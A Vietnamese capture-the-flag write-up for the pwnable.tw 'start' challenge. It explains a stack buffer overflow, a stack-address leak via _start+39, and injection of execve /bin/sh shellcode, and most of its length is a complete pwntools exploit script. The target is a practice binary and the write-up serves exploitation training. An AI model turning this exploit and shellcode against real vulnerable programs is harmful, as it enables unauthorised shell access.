# Write Up Pwnable: Challenge START

## Vấn đề
* [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/start)
- Sau khi checksec file: Phát hiện ra tất cả đều tắt, và file chỉ có phần nhập sau khi chương trình push xong. Sau đó exit.

## Giải pháp

- Khi xem source code thì tôi thấy rằng chall có lỗi Buffer Overflow ở ngay lúc <SYS_write> *
- Và sau khi debug, tôi tìm thấy được ở _start+39, ecx được truyền địa chỉ stack từ esp *
=> Có thể overwrite địa chỉ return trong stack thành địa chỉ của _start+39 để leak địa chỉ stack
=> Có thể đẩy shellcode vào và dùng execve để lấy shell và đọc flag

## Quá trình

- Từ địa chỉ return, tôi thấy có 20 bytes => Đẩy 20 bytes rác vào payload để chèn địa chỉ _start+39 đè return
- Sau khi leak được dữ liệu thì thấy rằng đây là địa chỉ trên stack
=> Viết shellcode và đẩy vào để lấy được shell

## Script

'''
#!/usr/bin/env python3

from pwn import *

exe = ELF('start', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda msg, num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        ''')
        input()


if args.REMOTE:
    p = remote('chall.pwnable.tw', 10000)
else:
    p = process([exe.path])
GDB()
shellcode = asm(
    '''
    xor ecx, ecx
    xor edx, edx
    push 6845231
    push 1852400175

    mov ebx, esp
    mov eax, 0xb
    int 0x80
    ''', arch='i386')

payload1 = b'A'*20 + p32(0x08048087)
s(payload1)

p.read()
stack_leak = u32(p.recv(4))
log.info(f"Leaked Stack Address: {hex(stack_leak)}")

payload2 = b'A'*20 + p32(stack_leak + 20) + shellcode
s(payload2)

p.interactive()
'''

